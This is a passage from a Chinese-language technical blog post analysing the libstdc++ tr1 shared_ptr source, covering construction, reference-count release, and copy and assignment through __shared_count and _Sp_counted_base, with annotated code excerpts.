指定分配器</span><br><span class="hljs-function">std::shared_ptr&lt;Foo&gt; <span class="hljs-title">p3</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Foo, [](<span class="hljs-keyword">auto</span> p) &#123;</span></span><br><span class="hljs-params"><span class="hljs-function">           std::cout &lt;&lt; <span class="hljs-string">&quot;Call delete from lambda...\n&quot;</span>;</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">delete</span> p;</span></span><br><span class="hljs-params"><span class="hljs-function">&#125;)</span></span>;<br></code></pre></td></tr></table></figure><p>手动释放</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 销毁旧的，赋值新的</span><br>p1.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>());<br><span class="hljs-comment">// 移除控制权并销毁对象</span><br>p1.<span class="hljs-built_in">reset</span>(<span class="hljs-literal">nullptr</span>);<br><span class="hljs-comment">// 不支持的操作</span><br>p1.<span class="hljs-built_in">reset</span>(p2);<br><br><span class="hljs-comment">// 没有release操作</span><br></code></pre></td></tr></table></figure><h2 id="2-3-shared源码分析"><a href="#2-3-shared源码分析" class="headerlink" title="2.3 shared源码分析"></a>2.3 shared源码分析</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">源码来自：<span class="hljs-regexp">/usr/i</span>nclude<span class="hljs-regexp">/c++/</span><span class="hljs-number">9</span><span class="hljs-regexp">/tr1/</span>shared_ptr.h，对无关内容做了适当删减<br></code></pre></td></tr></table></figure><h3 id="2-3-1-类整体结构"><a href="#2-3-1-类整体结构" class="headerlink" title="2.3.1 类整体结构"></a>2.3.1 类整体结构</h3><p>shared_ptr为资源管理对象，内部维护对应的资源指针。shared_ptr对象销毁时会根据递减内部的引用计数来决定是否真正销毁资源，同时支持多个对象共同享有同一份资源，只需要改变引用计数即可。整体类图如下：</p><p><img src="/2022/12/21/raii-yu-zhi-neng-zhi-zhen/image-20221221215737231.png" alt="shared类图"></p><h3 id="2-3-2-shared-ptr分析"><a href="#2-3-2-shared-ptr分析" class="headerlink" title="2.3.2 shared_ptr分析"></a>2.3.2 shared_ptr分析</h3><h4 id="a-gt-初始化过程"><a href="#a-gt-初始化过程" class="headerlink" title="a&gt; 初始化过程"></a>a&gt; 初始化过程</h4><p>__shared_ptr的构造函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, _Lock_policy _Lp&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">__shared_ptr</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>      <span class="hljs-keyword">typedef</span> _Tp   element_type;<br><span class="hljs-comment">// 默认构造函数</span><br>      __shared_ptr()<br>      : _M_ptr(<span class="hljs-number">0</span>), _M_refcount() <span class="hljs-comment">// never throws</span><br>      &#123; &#125;<br><span class="hljs-comment">// 单模板指针构造函数</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        <span class="hljs-keyword">explicit</span><br>        __shared_ptr(_Tp1* __p)<br>: _M_ptr(__p), _M_refcount(__p)<br>        &#123;<br>  __glibcxx_function_requires(_ConvertibleConcept&lt;_Tp1*, _Tp*&gt;)<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> _IsComplete[<span class="hljs-built_in">sizeof</span>(_Tp1)];<br>        <span class="hljs-comment">// 开启enable_shared_from_this</span><br>  __enable_shared_from_this_helper(_M_refcount, __p, __p);<br>&#125;<br><span class="hljs-comment">// 指定删除器的构造函数</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1, <span class="hljs-keyword">typename</span> _Deleter&gt;<br>        __shared_ptr(_Tp1* __p, _Deleter __d)<br>        : _M_ptr(__p), _M_refcount(__p, __d)<br>        &#123;<br>  __glibcxx_function_requires(_ConvertibleConcept&lt;_Tp1*, _Tp*&gt;)<br>      <span class="hljs-comment">// 开启enable_shared_from_this</span><br>  __enable_shared_from_this_helper(_M_refcount, __p, __p);<br>&#125;<br><span class="hljs-keyword">private</span>:<br>  _Tp*            _M_ptr;             <span class="hljs-comment">// 资源指针</span><br>      __shared_count&lt;_Lp&gt;  _M_refcount;    <span class="hljs-comment">// 资源管理对象</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>从源码可以得到shared_ptr指针初始化会将参数指针（来自new运算符或者是make_shared<T>得到）初始化给_M_ptr成员，再用参数指针去初始化__shared_count&lt;_Lp&gt;类，该类的构造函数如下：</T></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp = __default_lock_policy&gt;<br><span class="hljs-keyword">class</span> __shared_count<br>&#123;<br><span class="hljs-keyword">public</span>: <br><span class="hljs-comment">// 无参构造函数</span><br>    __shared_count()<br>        : _M_pi(<span class="hljs-number">0</span>) <span class="hljs-comment">// nothrow</span><br>        &#123; &#125;<br><span class="hljs-comment">// 单参数构造函数</span><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Ptr&gt;<br>    __shared_count(_Ptr __p) : _M_pi(<span class="hljs-number">0</span>)<br>    &#123;<br>        __try<br>        &#123;<br>            <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> std::tr1::remove_pointer&lt;_Ptr&gt;::type _Tp;<br>            <span class="hljs-comment">// 动态分配了一个生命期管理对象</span><br>            _M_pi = <span class="hljs-keyword">new</span> _Sp_counted_base_impl&lt;_Ptr, _Sp_deleter&lt;_Tp&gt;, _Lp&gt;(<br>                __p, _Sp_deleter&lt;_Tp&gt;());<br>        &#125;<br>        __catch(...)<br>        &#123;<br>            <span class="hljs-keyword">delete</span> __p;<br>            __throw_exception_again;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">// 指定删除器的构造函数</span><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Ptr, <span class="hljs-keyword">typename</span> _Deleter&gt;<br>    __shared_count(_Ptr __p, _Deleter __d) : _M_pi(<span class="hljs-number">0</span>)<br>    &#123;<br>        __try<br>        &#123;<br>            _M_pi = <span class="hljs-keyword">new</span> _Sp_counted_base_impl&lt;_Ptr, _Deleter, _Lp&gt;(__p, __d);<br>        &#125;<br>        __catch(...)<br>        &#123;<br>            __d(__p); <span class="hljs-comment">// Call _Deleter on __p.</span><br>            __throw_exception_again;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_count</span>&lt;_Lp&gt;;<br>    _Sp_counted_base&lt;_Lp&gt;*  _M_pi;<span class="hljs-comment">// 资源管理父类指针</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见在__shared_count&lt;_Lp&gt;类的构造函数中调用new运算符申请了一个_Sp_counted_base_impl&lt;_Ptr, _Sp_deleter&lt;_Tp&gt;, _Lp&gt;对象，该类的构造函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Ptr, <span class="hljs-keyword">typename</span> _Deleter, _Lock_policy _Lp&gt;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">_Sp_counted_base_impl</span>: <span class="hljs-keyword">public</span> _Sp_counted_base&lt;_Lp&gt;<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">// 构造函数--默认构造父类</span><br>      _Sp_counted_base_impl(_Ptr __p, _Deleter __d)<br>      : _M_ptr(__p), _M_del(__d) &#123; &#125;   <br><span class="hljs-keyword">private</span>:<br>      _Ptr      _M_ptr;  <span class="hljs-comment">// 被管理资源指针</span><br>      _Deleter  _M_del;  <span class="hljs-comment">// 资源释放器</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>该类public继承自_Sp_counted_base类，并且默认构造父类，父类构造函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp = __default_lock_policy&gt;<br><span class="hljs-keyword">class</span> _Sp_counted_base: <span class="hljs-keyword">public</span> _Mutex_base&lt;_Lp&gt;<br>&#123;<br><span class="hljs-keyword">public</span>:  <br><span class="hljs-comment">// 默认构造函数</span><br>    _Sp_counted_base(): _M_use_count(<span class="hljs-number">1</span>), _M_weak_count(<span class="hljs-number">1</span>) &#123; &#125;<br><span class="hljs-keyword">private</span>:  <br>    _Atomic_word  _M_use_count;     <span class="hljs-comment">// shared引用计数</span><br>    _Atomic_word  _M_weak_count;    <span class="hljs-comment">// weak引用计数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见将_M_use_count和_M_weak_count成员默认初始化为1，表示当前只被引用了一次，此时shared_ptr整体类布局如下：</p><p><img src="/2022/12/21/raii-yu-zhi-neng-zhi-zhen/image-20221222111102880.png" alt="shared_ptr类布局"></p><h4 id="b-gt-销毁过程"><a href="#b-gt-销毁过程" class="headerlink" title="b&gt; 销毁过程"></a>b&gt; 销毁过程</h4><p>__shared_ptr类不存在析构函数，直接看其组合类_shared_count的析构函数，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp = __default_lock_policy&gt;<br><span class="hljs-keyword">class</span> __shared_count<br>&#123;<br><span class="hljs-keyword">public</span>: <br><span class="hljs-comment">// 单参数构造函数</span><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Ptr&gt;<br>    __shared_count(_Ptr __p) : _M_pi(<span class="hljs-number">0</span>)<br>    &#123;<br>        __try<br>        &#123;<br>            <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> std::tr1::remove_pointer&lt;_Ptr&gt;::type _Tp;<br>            <span class="hljs-comment">// 动态分配了一个生命期管理对象</span><br>            _M_pi = <span class="hljs-keyword">new</span> _Sp_counted_base_impl&lt;_Ptr, _Sp_deleter&lt;_Tp&gt;, _Lp&gt;(<br>                __p, _Sp_deleter&lt;_Tp&gt;());<br>        &#125;<br>        __catch(...)<br>        &#123;<br>            <span class="hljs-keyword">delete</span> __p;<br>            __throw_exception_again;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">// 析构函数</span><br>    ~__shared_count() <span class="hljs-comment">// nothrow</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (_M_pi != <span class="hljs-number">0</span>)<br>            _M_pi-&gt;_M_release();<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_count</span>&lt;_Lp&gt;;<br>    _Sp_counted_base&lt;_Lp&gt;*  _M_pi;<span class="hljs-comment">// 资源管理父类指针--多态</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>析构函数中调用_Sp_counted_base_impl类的_M_release()函数，但是这个函数是在父类_Sp_counted_base_中实现的非纯虚函数，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp = __default_lock_policy&gt;<br><span class="hljs-keyword">class</span> _Sp_counted_base: <span class="hljs-keyword">public</span> _Mutex_base&lt;_Lp&gt;<br>&#123;<br><span class="hljs-keyword">public</span>:  <br>    _Sp_counted_base(): _M_use_count(<span class="hljs-number">1</span>), _M_weak_count(<span class="hljs-number">1</span>) &#123; &#125;<br>    <span class="hljs-type">void</span> _M_release() <span class="hljs-comment">// nothrow</span><br>    &#123;<br>        _GLIBCXX_SYNCHRONIZATION_HAPPENS_BEFORE(&amp;_M_use_count);<br>        <span class="hljs-comment">// _M_use_count-- == 1</span><br>        <span class="hljs-keyword">if</span> (__gnu_cxx::__exchange_and_add_dispatch(&amp;_M_use_count, <span class="hljs-number">-1</span>) == <span class="hljs-number">1</span>)<br>        &#123;<br>            _GLIBCXX_SYNCHRONIZATION_HAPPENS_AFTER(&amp;_M_use_count);<br>            <span class="hljs-comment">// 这里调用子类_Sp_counted_base_impl的_M_dispose()</span><br>            _M_dispose();<br>            <span class="hljs-keyword">if</span> (_Mutex_base&lt;_Lp&gt;::_S_need_barriers)<br>            &#123;<br>                __atomic_thread_fence (__ATOMIC_ACQ_REL);<br>            &#125;<br>            <span class="hljs-comment">// Be race-detector-friendly.  For more info see bits/c++config.</span><br>            _GLIBCXX_SYNCHRONIZATION_HAPPENS_BEFORE(&amp;_M_weak_count);<br>            <span class="hljs-comment">// 这里调用父类_Sp_counted_base的_M_destroy()</span><br>            <span class="hljs-keyword">if</span> (__gnu_cxx::__exchange_and_add_dispatch(&amp;_M_weak_count, <span class="hljs-number">-1</span>) == <span class="hljs-number">1</span>)<br>            &#123;<br>                _GLIBCXX_SYNCHRONIZATION_HAPPENS_AFTER(&amp;_M_weak_count);<br>                _M_destroy();<br>            &#125;<br>        &#125;<br>   &#125;<br>   <span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> _M_destroy() <span class="hljs-comment">// nothrow</span><br>   &#123; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>; &#125;<br><span class="hljs-keyword">private</span>:  <br>    _Atomic_word  _M_use_count;     <span class="hljs-comment">// shared引用计数</span><br>    _Atomic_word  _M_weak_count;    <span class="hljs-comment">// weak引用计数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>M_release()函数中首先对_M_use_count进行减1操作，如果减1之前为1，调用子类_Sp_counted_base_impl的_M_dispose()函数，再对_M_weak_count进行减1操作，同样判断减1前是否为1，如果是，调用父类_Sp_counted_base的_M_destroy()函数。代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 子类</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Ptr, <span class="hljs-keyword">typename</span> _Deleter, _Lock_policy _Lp&gt;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">_Sp_counted_base_impl</span>: <span class="hljs-keyword">public</span> _Sp_counted_base&lt;_Lp&gt;<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">// 构造函数--默认构造父类</span><br>      _Sp_counted_base_impl(_Ptr __p, _Deleter __d)<br>      : _M_ptr(__p), _M_del(__d) &#123; &#125;  <br><span class="hljs-comment">// 销毁资源</span><br>      <span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> _M_dispose() <span class="hljs-comment">// nothrow</span><br>      &#123; _M_del(_M_ptr); &#125;<br><span class="hljs-keyword">private</span>:<br>      _Ptr      _M_ptr;  <span class="hljs-comment">// 被管理资源指针</span><br>      _Deleter  _M_del;  <span class="hljs-comment">// 资源释放器</span><br>&#125;;<br><br><span class="hljs-comment">// 父类</span><br><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp = __default_lock_policy&gt;<br><span class="hljs-keyword">class</span> _Sp_counted_base: <span class="hljs-keyword">public</span> _Mutex_base&lt;_Lp&gt;<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">// 默认构造函数</span><br>    _Sp_counted_base(): _M_use_count(<span class="hljs-number">1</span>), _M_weak_count(<span class="hljs-number">1</span>) &#123; &#125;<br><span class="hljs-comment">// 销毁资源管理对象</span><br>    <span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> _M_destroy() <span class="hljs-comment">// nothrow</span><br>    &#123; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>; &#125;<br><span class="hljs-keyword">private</span>:  <br>    _Atomic_word  _M_use_count;     <span class="hljs-comment">// shared引用计数</span><br>    _Atomic_word  _M_weak_count;    <span class="hljs-comment">// weak引用计数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见，_M_dispose()中调用_M_del销毁器销毁被管理的资源对象，_M_destroy()中调用free销毁资源管理对象，可以得出结论：</p><ul><li>_M_use_count计数器控制被管理资源对象的声明周期</li><li>_M_weak_count计数器控制资源管理对象的声明周期</li></ul><h4 id="c-gt-拷贝过程分析"><a href="#c-gt-拷贝过程分析" class="headerlink" title="c&gt; 拷贝过程分析"></a>c&gt; 拷贝过程分析</h4><p>__shared_ptr的拷贝控制成员如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, _Lock_policy _Lp&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">__shared_ptr</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">// shared_ptr拷贝构造函数</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        __shared_ptr(<span class="hljs-type">const</span> __shared_ptr&lt;_Tp1, _Lp&gt;&amp; __r)<br>: _M_ptr(__r._M_ptr), _M_refcount(__r._M_refcount) <span class="hljs-comment">// never throws</span><br>        &#123; __glibcxx_function_requires(_ConvertibleConcept&lt;_Tp1*, _Tp*&gt;) &#125;<br><span class="hljs-comment">// weak_ptr拷贝构造函数--为了支持lock()操作</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        <span class="hljs-keyword">explicit</span> __shared_ptr(<span class="hljs-type">const</span> __weak_ptr&lt;_Tp1, _Lp&gt;&amp; __r)<br>: _M_refcount(__r._M_refcount) <span class="hljs-comment">// may throw</span><br>        &#123;<br>          __glibcxx_function_requires(_ConvertibleConcept&lt;_Tp1*, _Tp*&gt;)<br>          <span class="hljs-comment">// 因为_M_refcount(__r._M_refcount)可能会抛出异常，所以需要执行后再进行指针转移</span><br>          _M_ptr = __r._M_ptr;<br>&#125;<br><span class="hljs-comment">// 拷贝赋值运算符</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        __shared_ptr&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> __shared_ptr&lt;_Tp1, _Lp&gt;&amp; __r) <span class="hljs-comment">// never throws</span><br>        &#123;<br>          _M_ptr = __r._M_ptr;<br>          _M_refcount = __r._M_refcount; <span class="hljs-comment">// __shared_count::op= doesn&#x27;t throw</span><br>  <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br>  _Tp*            _M_ptr;             <span class="hljs-comment">// 资源指针</span><br>      __shared_count&lt;_Lp&gt;  _M_refcount;    <span class="hljs-comment">// 资源管理对象</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见支持使用shared_ptr和weak_ptr进行拷贝，后者是在weak_ptr中调用lock()函数时调用的。</p><p>初始化列表_M_refcount(__r._M_refcount)都调用了__shared_count&lt;_Lp&gt;类的拷贝构造函数进行拷贝；<br>_M_refcount &#x3D; _r.M_refcount调用了_shared_count&lt;_Lp&gt;类的赋值运算函数；</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp = __default_lock_policy&gt;<br><span class="hljs-keyword">class</span> __shared_count<br>&#123;<br><span class="hljs-keyword">public</span>: <br><span class="hljs-comment">// shared_count拷贝构造函数</span><br>    __shared_count(<span class="hljs-type">const</span> __shared_count&amp; __r)<br>        : _M_pi(__r._M_pi) <span class="hljs-comment">// nothrow</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (_M_pi != <span class="hljs-number">0</span>)<br>                <span class="hljs-comment">// use_count++</span><br>                _M_pi-&gt;_M_add_ref_copy();<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">                  void _M_add_ref_copy()</span><br><span class="hljs-comment">        &#123; __gnu_cxx::__atomic_add_dispatch(&amp;_M_use_count, 1); &#125;</span><br><span class="hljs-comment">            */</span><br>        &#125;<br><span class="hljs-comment">// weak_count拷贝构造函数</span><br>    <span class="hljs-keyword">explicit</span><br>        __shared_count(<span class="hljs-type">const</span> __weak_count&lt;_Lp&gt;&amp; __r)    <br>        : _M_pi(__r._M_pi)<br>    &#123;<br>              <span class="hljs-keyword">if</span> (_M_pi != <span class="hljs-number">0</span>)<br>                    <span class="hljs-comment">// weak_count++</span><br>            _M_pi-&gt;_M_add_ref_lock();<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">              template&lt;&gt; inline void _Sp_counted_base&lt;_S_mutex&gt;::_M_add_ref_lock()</span><br><span class="hljs-comment">            &#123;</span><br><span class="hljs-comment">                __gnu_cxx::__scoped_lock sentry(*this);</span><br><span class="hljs-comment">                if (__gnu_cxx::__exchange_and_add_dispatch(&amp;_M_use_count, 1) == 0)</span><br><span class="hljs-comment">                &#123;</span><br><span class="hljs-comment">                   _M_use_count = 0;</span><br><span class="hljs-comment">                   __throw_bad_weak_ptr();</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            */</span><br>              <span class="hljs-keyword">else</span><br>            __throw_bad_weak_ptr();<br>    &#125;<br><span class="hljs-comment">// 拷贝赋值运算符</span><br>    __shared_count&amp;<br>        <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> __shared_count&amp; __r) <span class="hljs-comment">// nothrow</span><br>    &#123;<br>        _Sp_counted_base&lt;_Lp&gt;* __tmp = __r._M_pi;<br>        <span class="hljs-comment">// 判断自赋值</span><br>        <span class="hljs-keyword">if</span> (__tmp != _M_pi)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (__tmp != <span class="hljs-number">0</span>)<br>                <span class="hljs-comment">// _M_use_count++</span><br>                __tmp-&gt;_M_add_ref_copy();<br>            <span class="hljs-keyword">if</span> (_M_pi != <span class="hljs-number">0</span>)<br>                <span class="hljs-comment">// 如果_M_use_count-- == 1调用Deleter销毁_M_ptr被管理对象</span><br>                <span class="hljs-comment">// 如果_M_weak_count-- == 1调用free销毁_Sp_counted_base_impl管理对象</span><br>                <span class="hljs-comment">// 换句话说，__shared_count内部的use_count主要用来标记被管理对象的生命周期，weak_count主要用来标记管理对象的生命周期。</span><br>                _M_pi-&gt;_M_release();<br>            _M_pi = __tmp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_count</span>&lt;_Lp&gt;;<br>    _Sp_counted_base&lt;_Lp&gt;*  _M_pi;<span class="hljs-comment">// 